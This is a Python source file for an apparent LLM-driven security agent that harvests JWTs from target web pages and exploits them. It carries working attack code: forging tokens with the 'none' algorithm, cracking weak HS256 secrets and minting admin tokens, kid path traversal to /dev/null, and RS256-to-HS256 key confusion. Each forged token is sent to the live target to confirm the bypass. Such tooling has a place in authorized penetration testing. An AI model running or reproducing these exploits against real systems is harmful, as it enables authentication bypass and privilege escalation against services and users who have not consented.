import asyncio
import json
import base64
import hmac
import hashlib
import jwt
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings

class JWTAgent(BaseAgent):
    """
    JWTAgent - Expert in JWT analysis and exploitation.
    Follows the V4 Specialist pattern.
    """

    def __init__(self, event_bus=None):
        super().__init__("JWTAgent", "Authentication & Authorization Specialist", event_bus, agent_id="jwt_agent")
        self.intercepted_tokens = []
        self.findings = []
        self.max_brute_attempts = 1000 # Configurable
        
    def _setup_event_subscriptions(self):
        """Subscribe to token discovery events."""
        if self.event_bus:
            self.event_bus.subscribe("auth_token_found", self.handle_new_token)
            logger.info(f"[{self.name}] Subscribed to 'auth_token_found' events.")

    async def handle_new_token(self, data: Dict[str, Any]):
        """Callback when a new token is found by other agents."""
        token = data.get("token")
        source_url = data.get("url")
        location = data.get("location", "unknown")
        
        if token and token not in self.intercepted_tokens:
            self.intercepted_tokens.append(token)
            self.think(f"Intercepted new JWT from {source_url} ({location})")
            await self._analyze_and_exploit(token, source_url, location)

    async def run_loop(self):
        """Main loop for the agent (if started manually or via TeamOrchestrator)."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 JWT Specialist active and listening for tokens...", "INFO")
        
        while self.running:
            await asyncio.sleep(1) # Keep alive for event bus

    async def check_url(self, url: str) -> Dict:
        """Discover tokens on a page and analyze them."""
        tokens = await self._discover_tokens(url)
        for token, location in tokens:
            await self._analyze_and_exploit(token, url, location)
        return {
            "vulnerable": len(self.findings) > 0,
            "findings": self.findings
        }

    async def _discover_tokens(self, url: str) -> List[Tuple[str, str]]:
        """Use browser to find JWTs in URL, cookies, local storage, page links, and body text."""
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        import re
        
        discovered = []
        self.think(f"🔍 Starting token discovery for {url}")
        
        # Regex for potential JWT (header.payload.signature)
        # Base64url characters: a-zA-Z0-9_-
        jwt_re = re.compile(r'(eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*)')

        # 1. Check current URL passed to the method
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        for val_list in params.values():
            for val in val_list:
                if self._is_jwt(val):
                    discovered.append((val, "url_param"))

        async with browser_manager.get_page() as page:
            async def scan_page(target_url):
                try:
                    self.think(f"Scanning page: {target_url}")
                    # Intercept headers
                    auth_header_token = None
                    async def handle_request(request):
                        nonlocal auth_header_token
                        auth = request.headers.get("authorization")
                        if auth and "Bearer " in auth:
                            t = auth.split("Bearer ")[1]
                            if self._is_jwt(t):
                                auth_header_token = t

                    page.on("request", handle_request)
                    await page.goto(target_url, wait_until="networkidle", timeout=10000)
                    
                    # A. Check URL
                    curr_url = page.url
                    p_curr = urlparse(curr_url)
                    p_params = parse_qs(p_curr.query)
                    for val_list in p_params.values():
                        for val in val_list:
                            if self._is_jwt(val):
                                discovered.append((val, "url_param"))

                    # B. Check Page Content (Links & Text)
                    # Get all hrefs and the entire body text
                    data = await page.evaluate("""
                        () => ({
                            links: Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
                            text: document.body.innerText,
                            html: document.documentElement.innerHTML
                        })
                    """)
                    
                    # Check Links
                    for link in data['links']:
                        p_link = urlparse(link)
                        l_params = parse_qs(p_link.query)
                        for val_list in l_params.values():
                            for val in val_list:
                                if self._is_jwt(val):
                                    discovered.append((val, "link_param"))
                    
                    # Check Text/HTML for JWT strings
                    matches = jwt_re.findall(data['text']) + jwt_re.findall(data['html'])
                    for m in matches:
                        if self._is_jwt(m):
                            discovered.append((m, "body_text"))

                    # C. Check Storage
                    cookies = await page.context.cookies()
                    for cookie in cookies:
                        if self._is_jwt(cookie['value']):
                            discovered.append((cookie['value'], "cookie"))
                    
                    storage = await page.evaluate("() => JSON.stringify(localStorage)")
                    storage_dict = json.loads(storage)
                    for k, v in storage_dict.items():
                        if isinstance(v, str) and self._is_jwt(v):
                            discovered.append((v, "localStorage"))
                            
                    if auth_header_token:
                        discovered.append((auth_header_token, "header"))

                except Exception as e:
                    logger.debug(f"Scan failed for {target_url}: {e}")

            # Execute scans
            await scan_page(url)
            
            # 2. Heuristic: If nothing found, try visiting parent or landing page
            if not discovered:
                # Try the root of the site if we are on a subpath
                p = urlparse(url)
                if p.path != "/" and p.path != "":
                    root_url = f"{p.scheme}://{p.netloc}/"
                    self.think(f"No tokens found on target. Trying landing page: {root_url}")
                    await scan_page(root_url)
        
        # Unique tokens only
        unique = {}
        for t, loc in discovered:
            if t not in unique:
                unique[t] = loc
                self.think(f"🎯 Discovered token at {loc}: {t[:20]}...")
                
        return list(unique.items())

    def _is_jwt(self, token: str) -> bool:
        """Heuristic to check if a string looks like a JWT."""
        parts = token.split('.')
        return len(parts) == 3 and all(len(p) > 4 for p in parts[:2])

    def _decode_token(self, token: str) -> Optional[Dict]:
        """Decode JWT parts without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(self._base64_decode(parts[0]))
            payload = json.loads(self._base64_decode(parts[1]))
            signature = parts[2]
            
            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw": token
            }
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to decode token: {e}")
            return None

    def _base64_decode(self, data: str) -> str:
        """Base64Url decode helper."""
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode('utf-8')

    async def _get_llm_strategy(self, decoded: Dict, url: str, location: str) -> Optional[Dict]:
        """Ask LLM to analyze the token and propose an attack plan."""
        from bugtrace.utils.parsers import XmlParser
        
        prompt = f"""
        TARGET: {url}
        LOCATION: {location}
        JWT_HEADER: {json.dumps(decoded['header'])}
        JWT_PAYLOAD: {json.dumps(decoded['payload'])}
        
        Analyze this token. Is there a clear path to privilege escalation or authentication bypass?
        Generate a plan using known JWT attack vectors.
        """
        
        response = await llm_client.generate(
            prompt=prompt,
            module_name="JWT_AGENT",
            system_prompt=self.system_prompt
        )
        
        tags = ["thought", "plan", "payload", "target_location"]
        return XmlParser.extract_tags(response, tags)

    async def _verify_token_works(self, forged_token: str, url: str, location: str) -> bool:
        """
        Sends a request with the forged token to verify validation bypass.
        Improved to check response content for success indicators.
        """
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        try:
            # 1. Setup Request Helper
            async def make_req(target_url, tok, loc):
                headers = {}
                final_url = target_url
                
                if loc == "header":
                    headers["Authorization"] = f"Bearer {tok}"
                elif loc == "cookie":
                    headers["Cookie"] = f"session={tok}"
                elif "param" in loc or loc == "manual":
                    # Inject into URL parameter
                    p = urlparse(target_url)
                    qs = parse_qs(p.query)
                    
                    found_param = False
                    for k, v in qs.items():
                        if any(self._is_jwt(val) for val in v):
                            qs[k] = [tok]
                            found_param = True
                    
                    if not found_param and loc == "manual":
                        # If we don't know where it goes, try 'token' and 'jwt'
                        qs["token"] = [tok]
                    
                    new_query = urlencode(qs, doseq=True)
                    final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))
                    
                    # Fallback for manual: also try as a header if URL injection doesn't look right
                    if loc == "manual" and not found_param:
                        headers["Authorization"] = f"Bearer {tok}"

                async with aiohttp.ClientSession() as session:
                    async with session.get(final_url, headers=headers, timeout=5) as r:
                        body = await r.text()
                        return r.status, body, final_url

            # 2. Baseline Status (Invalid)
            base_status, base_text, _ = await make_req(url, "invalid.token.123", location)
            
            # 3. Attack Status
            status, text, final_atack_url = await make_req(url, forged_token, location)
            
            self.think(f"Requesting: {final_atack_url}")
            self.think(f"Verification: Base Status={base_status} vs Forged Status={status}")
            self.think(f"Base Body: '{base_text[:50]}...' | Forged Body: '{text[:50]}...'")

            # 4. Decision Logic (Advanced)
            # - Success keywords (Dojo specific or generic)
            success_keywords = ["welcome", "admin", "logged in", "flag", "success", "bt7331", "role: admin", "MASTER_PASS", "ROOT_KEY"]
            fail_keywords = ["invalid", "unauthorized", "expired", "forbidden", "anonymous", "invalid token", "blocked"]
            
            text_lower = text.lower()
            base_text_lower = base_text.lower()
            
            # If status changed from error to success
            if base_status in [401, 403] and status == 200:
                self.think("SUCCESS: Status code change detected (Error -> 200)")
                return True
            
            # If status stays 200 but content indicates success
            if status == 200:
                # Check if we see success markers that weren't in base
                for sk in success_keywords:
                    if sk in text_lower and sk not in base_text_lower:
                        self.think(f"SUCCESS: Content-based indicator found '{sk}'")
                        return True
                
                # Check if fail markers disappeared
                for fk in fail_keywords:
                    if fk in base_text_lower and fk not in text_lower:
                        self.think(f"SUCCESS: Content-based indicator - failure marker '{fk}' disappeared")
                        return True

            return False
        except Exception as e:
            logger.debug(f"Token verification failed: {e}")
            return False

    async def _check_none_algorithm(self, token: str, url: str, location: str) -> bool:
        """Attempt 'none' algorithm attack."""
        parts = token.split('.')
        if len(parts) != 3: return False
        
        try:
            header = json.loads(self._base64_decode(parts[0]))
        except (json.JSONDecodeError, ValueError, TypeError):
            return False
        
        # Test variations of 'none'
        variations = ['none', 'None', 'NONE', 'nOnE']
        
        for alg in variations:
            new_header = header.copy()
            new_header['alg'] = alg
            
            h_json = json.dumps(new_header, separators=(',', ':')).encode()
            h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')
            
            # ATTACK: We must elevate privileges
            try:
                payload = json.loads(self._base64_decode(parts[1]))
                payload['admin'] = True
                payload['role'] = 'admin'
                p_json = json.dumps(payload, separators=(',', ':')).encode()
                p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
            except:
                p_b64 = parts[1] # Fallback to original if decode fails

            # Valid 'none' tokens have empty signature, but sometimes need trailing dot
            # Case 1: Header.Payload.
            forged_token = f"{h_b64}.{p_b64}."
            if await self._verify_token_works(forged_token, url, location):
                self.think(f"SUCCESS: 'none' algorithm bypass confirmed with alg={alg}")
                self.findings.append({
                    "type": "JWT None Algorithm",
                    "url": url,
                    "parameter": "alg",
                    "payload": f"alg:{alg}",
                    "severity": "CRITICAL",
                    "validated": True,
                    "status": "VALIDATED_CONFIRMED",
                    "description": f"JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to '{alg}', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
                    "reproduction": f"# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to '{alg}'\n# 2. Remove signature (keep trailing dot)\n# Forged token: {forged_token[:50]}..."
                })
                return True

            # Case 2: Header.Payload (no trailing dot - rare but exists)
            forged_token_nodot = f"{h_b64}.{p_b64}"
            if await self._verify_token_works(forged_token_nodot, url, location):
                 self.think(f"SUCCESS: 'none' algorithm bypass (no dot) confirmed with alg={alg}")
                 self.findings.append({
                    "type": "JWT None Algorithm",
                    "url": url,
                    "parameter": "alg",
                    "payload": f"alg:{alg} (no dot)",
                    "severity": "CRITICAL",
                    "validated": True,
                    "status": "VALIDATED_CONFIRMED",
                    "description": f"JWT None Algorithm bypass vulnerability (no trailing dot variant). The server accepts tokens with algorithm '{alg}' without a trailing dot, allowing complete signature bypass.",
                    "reproduction": f"# Forge JWT with 'none' algorithm (no trailing dot):\n# Forged token: {forged_token_nodot[:50]}..."
                })
                 return True

        return False

    async def _attack_brute_force(self, token: str, url: str, location: str):
        """Offline dictionary attack on HMAC secret."""
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'HS256':
            return
            
        self.think("Starting dictionary attack on HS256 secret...")
        
        # Common weak secrets
        wordlist = ["secret", "password", "123456", "jwt", "key", "auth", "admin", "token", "1234567890", "mysupersecret"]
        
        parts = token.split('.')
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            signature_actual = base64.urlsafe_b64decode(parts[2] + "==")
        except (ValueError, TypeError):
            return

        for secret in wordlist:
            # Calculate HMAC
            h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
            if h.digest() == signature_actual:
                self.think(f"🔥 CRITICAL: Found weak JWT secret: '{secret}'")
                
                # Immediate Exploitation: Forge Admin Token
                new_payload = decoded['payload'].copy()
                new_payload['admin'] = True
                new_payload['role'] = 'admin'
                
                # Check for checks
                if 'user' in new_payload: new_payload['user'] = 'admin'
                
                p_json = json.dumps(new_payload, separators=(',', ':')).encode()
                p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
                
                new_signing_input = f"{parts[0]}.{p_b64}".encode()
                new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
                new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')
                
                forged_token = f"{parts[0]}.{p_b64}.{new_sig_b64}"
                
                self.findings.append({
                    "type": "Weak JWT Secret",
                    "url": url,
                    "parameter": "header",
                    "payload": secret,
                    "evidence": f"Secret cracked: {secret}. Forged admin token created.",
                    "severity": "CRITICAL",
                    "validated": True,
                    "status": "VALIDATED_CONFIRMED",
                    "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
                    "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)"
                })
                
                if await self._verify_token_works(forged_token, url, location):
                    self.think("SUCCESS: Admin privilege escalation confirmed!")
                return

    async def _attack_kid_injection(self, token: str, url: str, location: str):
        """KID Injection for Directory Traversal / SQLi."""
        decoded = self._decode_token(token)
        if not decoded or 'kid' not in decoded['header']:
            return

        # Simple Directory Traversal Check
        # Try to make server use /dev/null (empty content) as key
        # Requires known alg (usually HS256 if we force it, or public key confusion)
        
        # Strategy: Change kid to /dev/null, sign with empty string
        new_header = decoded['header'].copy()
        new_header['kid'] = "../../../../../../../dev/null"
        # Force symmetric algebra if possible, or assume server treats key file content as symmetric key
        
        # This is a complex attack, usually requires signing with empty string
        h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().strip('=')
        p_b64 = token.split('.')[1]
        
        signing_input = f"{h_b64}.{p_b64}".encode()
        # Sign with empty key (content of /dev/null)
        sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
        
        forged_token = f"{h_b64}.{p_b64}.{sig_b64}"
        
        if await self._verify_token_works(forged_token, url, location):
            self.think("SUCCESS: KID Directory Traversal confirmed (/dev/null bypass)")
            self.findings.append({
                "type": "JWT KID Injection",
                "url": url,
                "parameter": "kid",
                "payload": "../../../../../../../dev/null",
                "severity": "HIGH",
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": "JWT KID (Key ID) injection via directory traversal. The 'kid' header parameter is vulnerable to path traversal, allowing use of /dev/null as the signing key (empty content). This enables forging valid tokens.",
                "reproduction": f"# Forge JWT with KID pointing to /dev/null:\n# 1. Set kid header to '../../../../../../../dev/null'\n# 2. Sign with empty key\n# Forged token: {forged_token[:60]}..."
            })

    async def _attack_key_confusion(self, token: str, url: str, location: str):
        """
        Algorithm Confusion Attack (RS256 -> HS256).
        Tries to use the server's public key as the symmetric secret.
        """
        from jwt.algorithms import RSAAlgorithm
        import aiohttp
        
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'RS256':
            return

        self.think("Attempting Key Confusion (RS256 -> HS256)...")
        
        # 1. Try to fetch public key (JWKS)
        # Simplify: assume standard path or extract from elsewhere if possible
        # For this PoC, we try standard /.well-known/jwks.json relative to target
        from urllib.parse import urlparse
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        jwks_url = f"{base_url}/.well-known/jwks.json"
        
        public_keys_objs = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(jwks_url, timeout=5) as resp:
                    if resp.status == 200:
                        jwks = await resp.json()
                        for key in jwks.get('keys', []):
                            # Convert JWK to Object
                            try:
                                public_key = RSAAlgorithm.from_jwk(json.dumps(key))
                                public_keys_objs.append(public_key)
                            except Exception as e:
                                logger.debug(f"Failed to parse JWK: {e}")
                        self.think(f"Found {len(public_keys_objs)} public keys at {jwks_url}")
        except Exception as e:
            logger.debug(f"Failed to fetch JWKS: {e}")
            
        if not public_keys_objs:
            self.think("Skipping Key Confusion: No public key found.")
            return

        # 2. Execute Attack
        # Try both SubjectPublicKeyInfo (SPKI) and PKCS1 formats
        from cryptography.hazmat.primitives import serialization
        formats_to_try = [
            serialization.PublicFormat.SubjectPublicKeyInfo,
            serialization.PublicFormat.PKCS1
        ]
        
        for key_obj in public_keys_objs: # We need the object, not just PEM
            for fmt in formats_to_try:
                try:
                    pub_key_pem = key_obj.public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=fmt
                    )
                    
                    # Create forged token signed with HS256 using the public key as secret
                    new_header = decoded['header'].copy()
                    new_header['alg'] = 'HS256'
                    
                    # Payload: Elevate privileges
                    new_payload = decoded['payload'].copy()
                    new_payload['role'] = 'admin'
                    new_payload['admin'] = True
                    
                    # Construct unsigned parts - use STANDARD JWT separators (no spaces)
                    h_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().strip('=')
                    p_json = json.dumps(new_payload, separators=(',', ':')).encode()
                    p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
                    
                    signing_input = f"{h_b64}.{p_b64}".encode()
                    
                    # Sign with HMAC-SHA256 using the PEM content as the secret
                    sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
                    sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
                    
                    forged_token = f"{h_b64}.{p_b64}.{sig_b64}"
                    
                    self.think(f"Generated Token ({fmt.name}): {forged_token}")

                    if await self._verify_token_works(forged_token, url, location):
                        self.think(f"SUCCESS: Key Confusion (RS256->HS256) confirmed with format {fmt}!")
                        self.findings.append({
                            "type": "JWT Key Confusion",
                            "url": url,
                            "parameter": "alg",
                            "payload": "RS256->HS256 with Public Key",
                            "severity": "CRITICAL",
                            "validated": True,
                            "status": "VALIDATED_CONFIRMED",
                            "description": f"JWT Algorithm Confusion vulnerability (RS256 to HS256). The server's public RSA key was used as an HMAC secret, allowing token forgery. Public key fetched from {jwks_url}.",
                            "reproduction": f"# Key Confusion Attack:\n# 1. Fetch public key from {jwks_url}\n# 2. Change alg from RS256 to HS256\n# 3. Sign with public key PEM as HMAC secret\n# Forged token: {forged_token[:60]}..."
                        })
                        return
                except Exception as e:
                    continue

    async def _analyze_and_exploit(self, token: str, url: str, location: str):
        """Full analysis and exploitation pipeline for a single token."""
        try:
            # 1. Decode and Analyze (Passive)
            decoded = self._decode_token(token)
            if not decoded:
                return

            self.think(f"Token Analysis: Alg={decoded['header'].get('alg')}, Claims={list(decoded['payload'].keys())}")
            
            # 2. Consult LLM for strategy
            strategy = await self._get_llm_strategy(decoded, url, location)
            if not strategy:
                # Fallback to standard attacks if LLM fails
                strategy = {"plan": ["Check None Algorithm", "Brute Force Secret", "Check KID Injection"]}

            # 3. Execute Attack Plan
            plan_raw = strategy.get("plan")
            if plan_raw:
                steps = [s.strip() for s in plan_raw.split('\n') if s.strip()] if isinstance(plan_raw, str) else plan_raw
                for step in steps:
                    self.think(f"Executing step: {step}")
                    step_lower = step.lower()
                    
                    if "none" in step_lower:
                        await self._check_none_algorithm(token, url, location)
                    elif "brute" in step_lower or "secret" in step_lower:
                        await self._attack_brute_force(token, url, location)
                    elif "kid" in step_lower or "injection" in step_lower:
                        await self._attack_kid_injection(token, url, location)
                    elif "confusion" in step_lower or "rsa" in step_lower or "hs256" in step_lower:
                        await self._attack_key_confusion(token, url, location)
            
        except Exception as e:
            logger.error(f"[{self.name}] Error analyzing token: {e}")

async def run_jwt_analysis(token: str, url: str) -> Dict:
    """Convenience function for standalone analysis."""
    agent = JWTAgent()
    await agent._analyze_and_exploit(token, url, "manual")
    return {"findings": agent.findings}

